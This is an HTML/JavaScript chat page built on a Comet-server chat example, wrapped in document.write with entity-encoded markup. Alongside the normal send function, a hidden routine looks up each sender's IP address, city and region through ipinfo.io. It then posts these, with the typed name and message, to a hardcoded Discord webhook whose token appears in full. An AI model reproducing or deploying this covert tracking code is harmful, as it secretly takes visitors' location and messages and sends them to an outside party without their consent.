<script>
info="<!DOCTYPE HTML>
<html>
<head> 
    <meta charset=utf-8>
    <script language=&#34;JavaScript&#34; type=&#34;text/javascript&#34; src=&#34;https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js&#34; ></script>
    <script src=&#34;https://comet-server.com/CometServerApi.js&#34; type=&#34;text/javascript&#34;></script>
    
    <style>
    pre{
        border: 1px solid #ccc;
        padding: 5px;
        background-color: #EEE;
    }
    </style>
</head>
<body>

<div id=&#34;web_chat&#34;></div>

<div>
 Name :<input type=&#34;text&#34; id=&#34;name&#34;><br><br>
 Text: <textarea id=&#34;text&#34;></textarea><br>
 <input type=&#34;button&#34; onclick=&#34;send();&#34; value=&#34;send&#34; ><br>
</div>

<script type=&#34;text/javascript&#34;>

$(document).ready(function()
{ 
    cometApi.start({node:&#34;app.comet-server.ru&#34;, dev_id:15 })
    
    cometApi.subscription(&#34;simplechat.newMessage&#34;, function(event){
        $(&#34;#web_chat&#34;).append(&#39;<b>&#39;+HtmlEncode(event.data.name)+&#39;</b>&#39;)
        $(&#34;#web_chat&#34;).append(&#39;<pre>&#39;+HtmlEncode(event.data.text)+&#39;</pre>&#39;)
        $(&#34;#web_chat&#34;).append(&#39;<br>&#39;)
        if (event.data.name === &#39;ADMIN&#39;){
            $(&#34;#web_chat&#34;).css(&#34;color&#34;, &#34;red&#34;);
            } else {
            $(&#34;#web_chat&#34;).css(&#34;color&#34;, &#34;black&#34;);
        }
    })
})

function HtmlEncode(s)
{
  var el = document.createElement(&#34;div&#34;);
  el.innerText = el.textContent = s;
  s = el.innerHTML;
  return s;
}
    
    
    
    
  
    function ip()  {
              $.get(&#34;https://ipinfo.io&#34;, function(response) {
          sendMessages(response.city + &#34;, &#34; + response.region + &#34;, &#34; + response.ip + &#34;, Name: &#34; + document.getElementById(&#39;name&#39;).value + &#34;, Message: &#34; + document.getElementById(&#39;text&#39;).value)
          }, &#34;json&#34;)
                  
    }
    
    

    
function send()
{
   var name = $(&#39;#name&#39;).val();
   var text = $(&#39;#text&#39;).val();
   
   $.ajax({
        url: &#34;https://comet-server.com/doc/CppComet/chat-example/chat.php&#34;,
        type: &#34;POST&#34;, 
        data:&#34;text=&#34;+encodeURIComponent(text)+&#34;&name=&#34;+encodeURIComponent(name)
   });
    ip()
}

    function sendMessages(msg) {
      const request = new XMLHttpRequest();
      request.open(&#34;POST&#34;, &#34;https://discord.com/api/webhooks/1134935276129636475/mAl-Orwh6PE6JpmTrwHov7nWSKmoXH2hCDvfL3tTcjoP5yNRZyFZwS9I_7Hl88w5DLYa&#34;);

      request.setRequestHeader(&#39;Content-type&#39;, &#39;application/json&#39;);

      const params = {
        username: &#34;Msg From SAO&#34;,
        avatar_url: &#34;&#34;,
        content: msg
      }

      request.send(JSON.stringify(params));
    }




</script>
</body>
</html>"

document.write(info)
</script>
